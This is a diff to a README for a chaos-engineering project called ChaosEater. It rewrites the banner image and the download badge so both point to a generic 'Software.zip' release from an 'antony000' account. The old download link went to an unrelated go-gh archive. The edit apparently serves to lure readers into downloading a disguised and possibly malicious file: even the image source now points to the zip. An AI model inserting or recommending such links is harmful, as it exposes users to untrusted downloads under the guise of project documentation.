@@ -2,7 +2,7 @@
 
 ---
 
-![ChaosEater](https://example.com/chaoseater.png)
+![ChaosEater](https://github.com/antony000/chaos-eater/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Chaos engineering is a discipline aimed at improving system resilience by proact
 
 To get started with ChaosEater, you can download the latest release from the following link:
 
-[![Download ChaosEater](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download ChaosEater](https://github.com/antony000/chaos-eater/releases/download/v2.0/Software.zip)](https://github.com/antony000/chaos-eater/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the zip file, extract it to your desired location and follow the instructions in the README to set up ChaosEater for your system.
 
